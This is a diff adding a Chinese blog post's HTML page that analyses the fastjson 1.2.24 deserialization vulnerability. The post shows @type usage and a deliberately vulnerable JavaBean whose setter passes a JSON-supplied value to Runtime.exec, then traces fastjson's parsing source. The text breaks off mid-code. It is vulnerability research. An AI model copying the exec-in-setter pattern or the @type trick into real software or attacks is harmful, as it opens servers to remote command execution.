@@ -1,0 +1,895 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mechoy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="FastJSON0x00 前言fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。 好用、用的多，就导致，这东西有漏洞的话，那就是很重要的了，所以这东西的漏洞也是躲不掉的； fastJson从1.2.24版本开始被发现漏洞，所以我也从1.2.24开始了 0x01 简单使用f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson1.2.24">
+<meta property="og:url" content="http://example.com/2022/11/12/fastjson1.2.24/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="FastJSON0x00 前言fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。 好用、用的多，就导致，这东西有漏洞的话，那就是很重要的了，所以这东西的漏洞也是躲不掉的； fastJson从1.2.24版本开始被发现漏洞，所以我也从1.2.24开始了 0x01 简单使用f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/1.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/2.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/3.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/4.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/5.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/6.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/7.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/8.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/9.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/10.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/11.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/12.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/13.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/14.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/15.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/16.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/17.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/18.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/19.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/20.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/21.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/22.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/23.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/24.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/25.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/26.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/27.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/28.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/29.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/30.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/31.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/32.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/33.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/34.png">
+<meta property="og:image" content="http://example.com/2022/11/12/fastjson1.2.24/35.png">
+<meta property="article:published_time" content="2022-11-11T16:44:22.000Z">
+<meta property="article:modified_time" content="2023-05-08T16:05:52.646Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/11/12/fastjson1.2.24/1.png">
+  
+  
+  <title>FastJson1.2.24 - Mechoy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mechoy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="FastJson1.2.24"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mechoy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-12 00:44" pubdate>
+          2022年11月12日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          113 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">FastJson1.2.24</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="FastJSON"><a href="#FastJSON" class="headerlink" title="FastJSON"></a>FastJSON</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
+<p>好用、用的多，就导致，这东西有漏洞的话，那就是很重要的了，所以这东西的漏洞也是躲不掉的；</p>
+<p>fastJson从1.2.24版本开始被发现漏洞，所以我也从1.2.24开始了</p>
+<h3 id="0x01-简单使用"><a href="#0x01-简单使用" class="headerlink" title="0x01 简单使用"></a>0x01 简单使用</h3><p>fastjson的作用，总结一下就是对象(JavaBean)-&gt;json字符串，json字符串-&gt;对象(JavaBean)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String text = JSON.toJSONString(obj); <span class="hljs-comment">//序列化</span><br>VO vo = JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">//反序列化</span><br></code></pre></td></tr></table></figure>
+
+<p>先定义一个javaBean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> Integer age;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造器调用...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name, Integer age)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;有参构造器调用...&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getName调用...&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setName调用...&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge调用...&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge调用...&quot;</span>);<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>JavaBean转JSON字符串没啥好看的，漏洞点也不是出现在这里，所以直接跳过，主要是看JSON转java对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    <span class="hljs-comment">// Json字符串转JavaBean</span><br>    String str1 = <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;zzz\&quot;,\&quot;age\&quot;:15&#125;&quot;</span>;<br>    String str2 = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mechoy.Person\&quot;,\&quot;name\&quot;:\&quot;xxx\&quot;,\&quot;age\&quot;:16&#125;&quot;</span>;<br>    System.out.println(<span class="hljs-string">&quot;-----------parse测试-----------&quot;</span>);<br>    Object parse = JSON.parse(str1);<br>    System.out.println(<span class="hljs-string">&quot;-----------parseObject测试-----------&quot;</span>);<br>    Object parse1 = JSON.parseObject(str1, Person.class);<br>    System.out.println(<span class="hljs-string">&quot;-----------@type parse测试-----------&quot;</span>);<br>    Object parse2 = JSON.parse(str2);<br>    System.out.println(<span class="hljs-string">&quot;-----------@type parseObject测试-----------&quot;</span>);<br>    JSONObject jsonObject = JSON.parseObject(str2);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/12/fastjson1.2.24/1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>从上面的例子可以看出：当在json字符串中使用@type去指定JavaBean时，服务端会去调用相应的无参构造器、setter、getter方法，并且**<code>@type</code>时客户端传输<strong>过来的(真实场景下:一般使用json进行数据传输，然后在服务端会优先进行json解析)，所以就是@type可控，并且</strong>属性的值也同样可控<strong>，最后就是会</strong>自动调用默认构造器、setter、getter方法**。一般自动调用时就容易出问题，就比如反序列化。</p>
+<p>假设：当一个JavaBean的无参构造器、setter、getter方法中存在危险方法、或能够间接的调用到危险方法等，那么这里就可以进行利用。举例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试JavaBean中存在危险方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Execute</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Execute</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Execute</span><span class="hljs-params">(String cmd)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        Runtime.getRuntime().exec(<span class="hljs-keyword">this</span>.cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/12/fastjson1.2.24/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，真实环境是不可能有这种情况的，这里只是做一个简单的举例；</p>
+<p>接下来就是来看一下，fastjson在反序列化的时候到底做了哪些事情</p>
+<h4 id="源码剖析"><a href="#源码剖析" class="headerlink" title="源码剖析"></a>源码剖析</h4><p>直接从<code>parseObject()</code>入手</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">parseObject</span><span class="hljs-params">(String text)</span> </span>&#123;<br>    Object obj = parse(text);		<span class="hljs-comment">// 先调用了一个parse() 其实这个和JSON.parse()一样，也就是可以理解为都会走到parse</span><br>    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>        <span class="hljs-keyword">return</span> (JSONObject) obj;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (JSONObject) JSON.toJSON(obj);	<span class="hljs-comment">// 将obj转为JSONObject</span><br>    	<span class="hljs-comment">// JSONObject其实类似于一个Map,里面将json字符串转为键值对的形式，或者也可以理解为变相的JavaBean</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接跟进<code>parse(text)</code>，接下来就是几个方法的重载，直接来到<code>com.alibaba.fastjson.JSON#parse(java.lang.String, int)</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进来到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)</code>这里面是对JSON字符串的很多判断，根据</p>
+<p><code>lexer.token()</code>进行switch的选择，<code>lexer.token()</code>的值又是根据JSON字符串的第一位字符决定的，可以暂且理解为：不同格式的JSON字符串吧</p>
+<p><img src="/2022/11/12/fastjson1.2.24/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进后来到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>这里也是一大堆判断，emmm，一步步走吧，来到这里，查找了一下JSON是否存在<code>@type</code>或者<code>$ref</code>这种特殊符号开头，这里其实就是将常规JSON字符和JavaBean进行一个区分操作了，应该是这样的，继续向下</p>
+<p><img src="/2022/11/12/fastjson1.2.24/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>一路向下，一直走到这里，对key进行了一个判断，是@type的话，就获取后面的全类名，然后进行一个类加载，</p>
+<p><img src="/2022/11/12/fastjson1.2.24/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个类加载也比较简单，可以简单看一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 删除了一些不重要的地方</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;<br>    <span class="hljs-keyword">if</span> (className == <span class="hljs-keyword">null</span> || className.length() == <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;	<span class="hljs-comment">// 看下类名是不是空或&quot;&quot;</span><br><br>    Class&lt;?&gt; clazz = mappings.get(className);	<span class="hljs-comment">// 检查该类是否是已加载，mappings为一些基本数据类型、hashMap等</span><br><br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">return</span> clazz;&#125;<br><br>    <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;		<span class="hljs-comment">// 判断加载的是否是数组类，是的话，则删除全类名中第一位的[,在进行加载</span><br>        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>        <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>    &#125;<br>		<span class="hljs-comment">// 是否是以L开头的全类名或接口名，是的话，就删除L和最后的;然后进行类加载</span><br>    <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>        String newClassName = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (classLoader != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// 传入的是默认类加载器，默认情况下为null,所以此处忽略</span><br>            ...<br>        &#125;<br>    &#125; <br><br>    <span class="hljs-keyword">try</span> &#123;<br>        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();<span class="hljs-comment">// 获取上下文类加载器</span><br><br>        <span class="hljs-keyword">if</span> (contextClassLoader != <span class="hljs-keyword">null</span>) &#123;<br>            clazz = contextClassLoader.loadClass(className);	<span class="hljs-comment">// 加载类</span><br>            mappings.put(className, clazz);	<span class="hljs-comment">// 将该类添加至mappings中，省的下次再加载了</span><br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        <span class="hljs-comment">// skip</span><br>    &#125;<br><br>    <span class="hljs-keyword">try</span> <br>        clazz = Class.forName(className);	<span class="hljs-comment">// 有些类loadClass加载不了，所以在来个forName补充一下</span><br>        mappings.put(className, clazz);<br><br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125; ...<br><br>    <span class="hljs-keyword">return</span> clazz;	<span class="hljs-comment">// 如果上面都搞不定，那就寄，返回个null</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来又是一堆判断，基本上都是没啥操作，然后来到获取反序列化器的地方，跟进这里</p>
+<p><img src="/2022/11/12/fastjson1.2.24/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.reflect.Type)</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>这里也都是很多判断，然后就挑挑捡捡截下图，都是一些基本的判断，或者是开发考虑到的一些其他因素</p>
+<p><img src="/2022/11/12/fastjson1.2.24/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>一路向下，来到该方法的最底部，上面的判断在普通的JavaBean基本上都不会实现，所以通常情况下都会走到这里</p>
+<p><img src="/2022/11/12/fastjson1.2.24/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到<code>com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer</code>首先需要注意下ASM：ASM 是一个 <strong>Java字节码</strong>操控框架。它能够以<strong>二进制形式</strong>修改已有类或者动态生成类。这个其实主要关注的就是在下面，有一个判断，根据<code>asmEnable</code>来决定是使用动态创建的反序列化器还是fastJson中写好的反序列化器，两者基本没多大区别，只不过动态创建的无法调试</p>
+<p><img src="/2022/11/12/fastjson1.2.24/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来又是一堆判断，直接向下，来到，跟进<code>JavaBeanInfo.build()</code></p>
+<p><img src="/2022/11/12/fastjson1.2.24/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>可以先来看一下这个方法，大致做了哪些事情</p>
+<p><img src="/2022/11/12/fastjson1.2.24/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>该方法中，其实最需要关注的就是那三个for循环，上面的也都是一些创建和循环之类的东西</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td 